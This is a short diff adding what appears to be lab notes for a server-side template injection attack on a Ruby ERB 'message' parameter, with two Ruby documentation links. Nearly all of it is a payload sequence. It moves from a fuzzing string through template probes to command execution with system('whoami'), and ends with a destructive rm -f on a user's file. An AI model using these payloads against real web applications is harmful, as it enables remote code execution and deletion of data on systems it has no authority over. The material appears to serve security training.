@@ -1,0 +1,10 @@
+/?message=${{<%[%'"}}%\
+/?message=abc}<tag>
+/?message=abc}}<tag>
+/?message=<%25=+foobar+%25>
+/?message=<%25%3d+7*7+%25>
+/?message=<%25%3d+system("whoami")+%25>
+/?message=<%25%3d+system("rm+-f+/home/carlos/morale.txt")+%25>
+
+https://docs.ruby-lang.org/en/2.7.0/ERB.html
+https://ruby-doc.org/core-2.7.0/Kernel.html#method-i-system
